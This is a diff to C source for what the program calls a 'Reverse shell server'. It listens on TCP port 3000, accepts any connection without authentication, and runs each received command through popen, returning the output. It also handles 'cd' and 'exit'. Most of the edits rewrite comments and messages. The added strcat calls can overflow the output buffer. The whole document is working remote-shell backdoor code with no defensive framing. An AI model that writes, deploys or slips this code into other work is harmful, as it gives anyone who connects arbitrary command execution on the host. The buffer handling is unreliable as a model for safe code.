@@ -12,7 +12,7 @@
 #define PORT 3000
 #define BUFFER_SIZE 1024
 
-// Function to check if a string is empty or contains only whitespace
+// A helper function to check if a string is empty or only whitespace.
 int is_empty_or_whitespace(const char *s)
 {
     while (*s)
@@ -26,21 +26,17 @@ int is_empty_or_whitespace(const char *s)
     return 1;
 }
 
-// Thread function to handle an individual client connection.
-// Adjusted to handle "cd" commands properly by updating the working directory.
 void *client_handler(void *arg)
 {
     int client_sock = *(int *)arg;
     free(arg);
     char command[BUFFER_SIZE];
-    char output[BUFFER_SIZE * 2];
+    char output[BUFFER_SIZE * 2]; // Buffer for command output
     ssize_t num_read;
 
     while (1)
     {
         memset(command, 0, sizeof(command));
-        
-        // Receive command from the client
         num_read = recv(client_sock, command, sizeof(command) - 1, 0);
         if (num_read <= 0)
         {
@@ -49,7 +45,7 @@ void *client_handler(void *arg)
         }
         command[num_read] = '\0';
 
-        // Check if the command is empty or only whitespace, and continue without blocking
+        // Skip command execution if it's empty.
         if (is_empty_or_whitespace(command))
         {
             const char *empty_msg = "No command provided.\n";
@@ -57,20 +53,19 @@ void *client_handler(void *arg)
             continue;
         }
 
-        // Process your "exit" command and "cd" command, etc.
+        // Special handling for "exit"
         if (strncmp(command, "exit", 4) == 0)
         {
             break;
         }
 
+        // Special handling for the "cd" command:
         if (strncmp(command, "cd ", 3) == 0)
         {
-            // Get the argument after "cd "
             char *dir = command + 3;
             if (is_empty_or_whitespace(dir))
             {
-                // Default to HOME directory if no argument is provided
-                dir = getenv("HOME");
+                dir = getenv("HOME"); // Default to HOME directory if no argument provided.
             }
             if (chdir(dir) != 0)
             {
@@ -78,7 +73,6 @@ void *client_handler(void *arg)
             }
             else
             {
-                // Indicate the new directory
                 char cwd[1024];
                 if (getcwd(cwd, sizeof(cwd)) != NULL)
                 {
@@ -89,6 +83,8 @@ void *client_handler(void *arg)
                     snprintf(output, sizeof(output), "cd: error retrieving current directory\n");
                 }
             }
+            // Append newline to ensure data is sent.
+            strcat(output, "\n");
             send(client_sock, output, strlen(output), 0);
             continue;
         }
@@ -120,7 +116,9 @@ void *client_handler(void *arg)
             pclose(fp);
         }
 
-        // Send the command output back to the client
+        // Ensure the output is non-empty by appending a newline character.
+        strcat(output, "\n");
+
         if (send(client_sock, output, strlen(output), 0) < 0)
         {
             perror("send failed");
@@ -138,59 +136,52 @@ int main()
     struct sockaddr_in server_addr, client_addr;
     socklen_t client_addr_len = sizeof(client_addr);
 
-    // Create the socket
     if ((server_sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
     {
-        perror("socket creation failed!");
+        perror("socket creation failed");
         exit(EXIT_FAILURE);
     }
 
-    // Prepare the sockaddr_in structure
     server_addr.sin_family = AF_INET;
     server_addr.sin_port = htons(PORT);
     server_addr.sin_addr.s_addr = INADDR_ANY;
     memset(&(server_addr.sin_zero), '\0', 8);
 
-    // Bind the socket to the port
     if (bind(server_sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0)
     {
-        perror("bind failed!");
+        perror("bind failed");
         close(server_sock);
         exit(EXIT_FAILURE);
     }
 
-    // Listen for incoming connections
     if (listen(server_sock, 5) < 0)
     {
-        perror("listen failed!");
+        perror("listen failed");
         close(server_sock);
         exit(EXIT_FAILURE);
     }
 
-    printf("Reverse shell server listening...\n");
+    printf("Reverse shell server listening on port %d...\n", PORT);
 
-    // Main loop: accept incoming connections
     while (1)
     {
         int *client_sock = malloc(sizeof(int));
         if ((*client_sock = accept(server_sock, (struct sockaddr *)&client_addr, &client_addr_len)) < 0)
         {
-            perror("accept failed!");
+            perror("accept failed");
             free(client_sock);
             continue;
         }
         printf("Connection accepted from %s:%d\n", inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
 
-        // Create a new thread for the client
         pthread_t tid;
         if (pthread_create(&tid, NULL, client_handler, client_sock) != 0)
         {
-            perror("failed to create thread!");
+            perror("Failed to create thread");
             close(*client_sock);
             free(client_sock);
             continue;
         }
-        // Detach thread so resources are freed automatically when thread exits
         pthread_detach(tid);
     }
 
